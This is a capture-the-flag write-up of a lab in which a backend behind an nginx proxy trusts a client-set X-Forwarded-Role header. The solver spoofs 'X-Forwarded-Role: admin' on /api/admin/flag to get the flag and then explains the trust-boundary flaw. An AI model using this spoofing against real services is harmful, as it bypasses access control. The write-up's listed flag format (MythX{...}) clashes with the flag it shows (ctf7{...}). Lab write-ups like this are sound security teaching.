# CTF Writeup: API Gateway

**Challenge Name:** API Gateway
**Category:** Web / API Access Control
**Flag Format:** MythX{...}

### Challenge Description

A reverse proxy (nginx) performs role-based auth and forwards requests to backend API. Goal is to access admin endpoint by tampering with forwarded headers.

---

### Solution

#### Step 1: Identify Endpoint

- Start the lab and open API docs from web UI.
- Endpoint discovered: `GET /api/admin/flag`.

#### Step 2: Header Trust Check

- Reverse proxy architecture suggests backend may trust headers such as `X-Forwarded-Role`.
- Try spoofing role header to escalate privileges.

#### Step 3: Exploit

- Send request in Postman:
  - `GET /api/admin/flag`
  - Header: `X-Forwarded-Role: admin`

- Backend accepted and returned admin response.

#### Step 4: Flag Received

Response JSON:

```json
{
  "flag": "ctf7{API_fate_way_cbfe713a}",
  "message": "Welcome, administrator",
  "status": "success"
}
```

- Extracted flag: `ctf7{API_fate_way_cbfe713a}`.

---

### Root Cause

- Insecure trust of client-controlled forwarded role header.
- Proxy-auth trust boundary not enforced, allowing direct spoofing.

---

### Tools Used

- Browser + API docs
- Postman
